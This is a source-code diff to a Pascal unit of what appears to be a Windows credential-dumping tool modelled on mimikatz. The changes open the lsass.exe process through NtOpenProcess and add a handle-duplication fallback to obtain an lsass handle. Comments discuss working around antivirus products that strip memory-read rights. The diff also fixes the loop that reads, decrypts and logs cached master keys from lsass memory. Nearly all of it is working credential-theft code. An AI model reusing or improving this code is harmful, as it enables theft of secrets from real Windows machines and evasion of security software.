@@ -1,12 +1,13 @@
 unit uLSA;
 
-{$mode delphi}
+//{$mode delphi}
+{$mode objfpc}{$H+}
 
 interface
 
 uses
   windows,Classes, SysUtils,dos,
-  ucryptoapi,utils,upsapi,umemory,udebug;
+  ucryptoapi,utils,upsapi,umemory,udebug,ntdll,uhandles;
 
 function decryptLSA(cbmemory:ulong;encrypted:array of byte;var decrypted:tbytes):boolean;
 function encryptLSA(cbmemory:ulong;decrypted:array of byte;var encrypted:tbytes):boolean;
@@ -25,6 +26,7 @@ function lsa_set_secret(const Server, KeyName,Password: string): Boolean;
 
 var
   deskey,aeskey,iv:tbytes;
+  lsass_handle:thandle=thandle(-1);
 
 implementation
 
@@ -635,6 +637,35 @@ result:=extractlsakeys (pid,ivOffset,desOffset ,aesOffset,deskey,aeskey,iv);
 
 end;
 
+function callback2(param:pointer=nil):dword;stdcall;
+var
+  lpszProcess : PChar;
+  size:dword;
+  h:thandle;
+begin
+//log('callback');
+//do something with duplicatedobject ...
+//log('param:'+inttohex(nativeuint(param),sizeof(param)));
+if param=nil then exit;
+h:=thandle(param^);
+//log('handle:'+inttohex(h,sizeof(thandle)));
+//it should be the responsibility of the callback to close the duplicated handle
+lpszProcess := AllocMem(MAX_PATH);
+size:=MAX_PATH;
+if QueryFullProcessImageNameA(h,0,lpszProcess ,@size)=true then
+begin
+     log(strpas(lpszProcess));
+     if pos('lsass.exe',strpas(lpszProcess))>0
+     then lsass_handle:=h
+     else if h<>thandle(-1) then closehandle(h);
+end
+else
+begin
+     log('QueryFullProcessImageNameA NOK,'+inttostr(getlasterror));
+     if h<>thandle(-1) then closehandle(h);
+end
+end; //function callback(param:thandle):dword;stdcall;
+
 //dd lsasrv!LsaInitializeProtectedMemory
 //dd lsasrv!h3DesKey
 //dd lsasrv!hAesKey
@@ -656,7 +687,7 @@ var
  hmod:thandle=0;
  MODINFO:  MODULEINFO;
  keySigOffset:nativeuint;
- hprocess:thandle=0;
+ hprocess:thandle=-1;
  hmods:array[0..1023] of thandle;
  cbneeded,count:dword;
  szModName:array[0..254] of char;
@@ -668,6 +699,11 @@ var
  extracted3DesKey81, extractedAesKey81:KIWI_BCRYPT_KEY81;
  //extracted3DesKey:pointer;
  i:byte;
+ objectTypeInfo:pointer;
+ status:ntstatus;
+ dwSize     :DWORD;
+ oa:TObjectAttributes;
+cid:CLIENT_ID ;
 begin
 log('**** findlsakeys ****');
   result:=false;
@@ -723,9 +759,40 @@ keySigOffset:=SearchMem(getcurrentprocess,MODINFO.lpBaseOfDll ,MODINFO.SizeOfIma
 log('keySigOffset:'+inttohex(keySigOffset,sizeof(pointer)),0); //dd lsasrv!LsaInitializeProtectedMemory
 
 //lets search in lsass mem now
-hprocess:=openprocess( PROCESS_VM_READ {or PROCESS_VM_WRITE or PROCESS_VM_OPERATION or PROCESS_QUERY_INFORMATION},
-                                      false,pid);
+//hprocess:=openprocess( PROCESS_VM_READ {or PROCESS_VM_WRITE or PROCESS_VM_OPERATION or PROCESS_QUERY_INFORMATION},false,pid);
+InitializeObjectAttributes(oa,nil,0,0,nil);
+cid.UniqueProcess :=pid;
+cid.UniqueThread :=0;
+status:=NtOpenProcess(@hprocess,PROCESS_VM_READ ,@oa,@cid);
+//automate if basic method fails
+{
+if gethandles (upsapi._EnumProc2('wininit.exe'),'process',@callback2 ) then log('gethandles OK') else log('gethandles NOK');
+hprocess:= lsass_handle;
+}
+//
+if (hprocess=thandle(-1)) or (hprocess=0) then
+   begin
+   log('openprocess failed - '+inttostr(getlasterror));
+   exit;
+   end
+   else log('hprocess:'+inttohex(hprocess,sizeof(hprocess)));
 
+dwSize     :=sizeof(_OBJECT_BASIC_INFORMATION);
+objectTypeInfo :=allocmem(dwSize);
+//some AV's like bitdefender will return a handle with grantedaccess=0
+//or duplicated grantedaccess=1FFFCF
+//in both cases, we are missing PROCESS_VM_READ ...
+status:= NtQueryObject(hprocess,ObjectBasicInformation,objectTypeInfo,dwSize,@dwSize);
+if status=0
+   then
+   begin
+   log('GrantedAccess:'+inttohex(OBJECT_BASIC_INFORMATION(objectTypeInfo^).GrantedAccess,sizeof(dword) ));
+   if (OBJECT_BASIC_INFORMATION(objectTypeInfo^).GrantedAccess and PROCESS_VM_READ) <> PROCESS_VM_READ
+      then log('PROCESS_VM_READ failed');
+   end
+   else log('NtQueryObject failed - '+inttohex(status,sizeof(status)));
+
+freemem(objectTypeInfo);
 //we dont need the below apart from testing if module is loaded in lsass ...
 {
 lsasrvMem:=0;
@@ -759,7 +826,10 @@ ivOffset:=keySigOffset + IV_OFFSET+ivOffset+4;
 //will match dd lsasrv!InitializationVector
 log('IV_OFFSET:'+inttohex(ivOffset,sizeof(pointer)),0); //dd InitializationVector
 setlength(iv,16);
-ReadMem(hprocess, ivoffset, @iv[0], 16);
+if ReadMem(hprocess, ivoffset, @iv[0], 16)=false then
+    begin
+    log('ReadMem=false '+inttohex(ivoffset,sizeof(pointer)));
+    end;
 log('IV:'+ByteToHexaString (IV),0);
 
 //keySigOffset:7FFEEE887696
@@ -1057,30 +1127,30 @@ hprocess:=openprocess( PROCESS_VM_READ {or PROCESS_VM_WRITE or PROCESS_VM_OPERAT
                     ZeroMemory(@list[0],sizeof(list));
                     ReadMem  (hprocess,offset,list );
                     //lets skip the first one
-                    current:=nativeuint(PKIWI_MASTERKEY_CACHE_ENTRY (@list[0] ).flink);
-                    bret:=ReadMem  (hprocess,PKIWI_MASTERKEY_CACHE_ENTRY (@list[0] ).flink,list );
+                    current:=nativeuint(PKIWI_MASTERKEY_CACHE_ENTRY (@list[0])^.flink);
+                    bret:=ReadMem  (hprocess,PKIWI_MASTERKEY_CACHE_ENTRY (@list[0] )^.flink,list );
                     log('*****************************************************',1);
                     if bret then
-                    while PKIWI_MASTERKEY_CACHE_ENTRY (@list[0] ).flink<>offset do
+                    while PKIWI_MASTERKEY_CACHE_ENTRY (@list[0] )^.flink<>offset do
                     begin
                     //
-                    log('LUID:'+inttohex(PKIWI_MASTERKEY_CACHE_ENTRY (@list[0]).LogonId.LowPart,4) ,1) ;
-                    log('GUID:'+GUIDToString (PKIWI_MASTERKEY_CACHE_ENTRY (@list[0]).KeyUid),1) ;
-                    FileTimeToLocalFileTime (PKIWI_MASTERKEY_CACHE_ENTRY (@list[0]).insertTime,localft) ;
+                    log('LUID:'+inttohex(PKIWI_MASTERKEY_CACHE_ENTRY (@list[0])^.LogonId.LowPart,4) ,1) ;
+                    log('GUID:'+GUIDToString (PKIWI_MASTERKEY_CACHE_ENTRY (@list[0])^.KeyUid),1) ;
+                    FileTimeToLocalFileTime (PKIWI_MASTERKEY_CACHE_ENTRY (@list[0])^.insertTime,localft) ;
                     FileTimeToSystemTime(localft, st );
                     log('Time:'+DateTimeToStr (SystemTimeToDateTime (st)),1);
-                    setlength(decrypted,PKIWI_MASTERKEY_CACHE_ENTRY (@list[0]).keySize);
-                    if decryptLSA (PKIWI_MASTERKEY_CACHE_ENTRY (@list[0]).keySize ,PKIWI_MASTERKEY_CACHE_ENTRY (@list[0]).key ,decrypted)=false
+                    setlength(decrypted,PKIWI_MASTERKEY_CACHE_ENTRY (@list[0])^.keySize);
+                    if decryptLSA (PKIWI_MASTERKEY_CACHE_ENTRY (@list[0])^.keySize ,PKIWI_MASTERKEY_CACHE_ENTRY (@list[0])^.key ,decrypted)=false
                     then log('decryptLSA NOT OK',1)
                     else
                     begin
                     log('MasterKey:'+ByteToHexaString(decrypted),1);
-                    if crypto_hash_(CALG_SHA1, @decrypted[0], PKIWI_MASTERKEY_CACHE_ENTRY (@list[0]).keySize, dgst, SHA_DIGEST_LENGTH )
+                    if crypto_hash_(CALG_SHA1, @decrypted[0], PKIWI_MASTERKEY_CACHE_ENTRY (@list[0])^.keySize, dgst, SHA_DIGEST_LENGTH )
                        then log('SHA1:'+ByteToHexaString (dgst),1);
                     end;
                     //next logsesslist
-                    current:=nativeuint(PKIWI_MASTERKEY_CACHE_ENTRY (@list[0] ).flink);
-                    ReadMem  (hprocess,PKIWI_MASTERKEY_CACHE_ENTRY (@list[0] ).flink,list );
+                    current:=nativeuint(PKIWI_MASTERKEY_CACHE_ENTRY (@list[0] )^.flink);
+                    ReadMem  (hprocess,PKIWI_MASTERKEY_CACHE_ENTRY (@list[0] )^.flink,list );
                     log('*****************************************************',1)
                     end;//while
 
